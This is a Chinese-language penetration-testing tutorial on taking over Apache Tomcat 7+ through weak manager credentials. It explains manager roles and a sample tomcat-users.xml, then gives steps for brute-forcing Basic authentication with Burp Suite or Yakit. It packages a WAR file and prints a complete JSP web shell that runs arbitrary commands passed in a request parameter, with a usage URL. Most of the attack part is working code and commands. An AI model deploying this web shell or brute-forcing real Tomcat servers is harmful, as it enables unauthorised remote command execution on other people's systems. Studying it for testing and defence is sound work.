Tomcat7+ 弱口令 && 后台getshell漏洞

Tomcat支持登录后台，在后台部署war文件(jsp压缩成zip再改后缀war)，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。
## **管理账户与管理权限**
Tomcat7+权限分为：
 - manager（后台管理）
   - manager-gui 拥有html页面权限
   - manager-status 拥有查看status的权限
   - manager-script 拥有text接口的权限，和status权限
   - manager-jmx 拥有jmx权限，和status权限
 - host-manager（虚拟主机管理）
   - admin-gui 拥有html页面权限
   - admin-script 拥有text接口权限
详情阅读 http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html

在Tomcat的conf/tomcat-users.xml文件中配置用户的权限：
```
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
    <role rolename="manager-gui"/>
    <role rolename="manager-script"/>
    <role rolename="manager-jmx"/>
    <role rolename="manager-status"/>
    <role rolename="admin-gui"/>
    <role rolename="admin-script"/>
    <user username="tomcat" password="tomcat" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />
</tomcat-users>
```
这里创建了个用户tomcat拥有上述所有权限，密码是`tomcat`。

正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。

## **漏洞测试**
1. 弱口令爆破账号。
在tomcat高版本中，错误密码多次，会锁账号，高版本不要爆破，手动试验弱口令。
```
1 使用yakit弱口令检测一键爆破
2 使用BP进行basic认证爆破
账号:密码 是一起base64加密放入请求头的Authoration参数。
 1. 选择变量$base64=$
 2. playload选择自定义迭代器
    第一个迭代器输入账号字典
    第二个迭代器输入密码字典
    分隔符填写 :
    playload处理，添加，选择Base64-encode
    取消勾选=自动进行url编码。
 3. 爆破响应码200
```
2. 登录后台，上传war包，war包名自动解压成网站目录。

打war包:
```
1. jsp压缩成zip，改后缀为war

或

2. java命令中：jar -cvf shell.war shell.jsp
```
shell.jsp:
```
<% if("x".equals(request.getParameter("pwd"))){
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.println(new String(b));
    }
    out.print("</pre>");
} %>

```
可以访问/shell/shell.jsp?pwd=x&i=ls /执行shell命令并回显。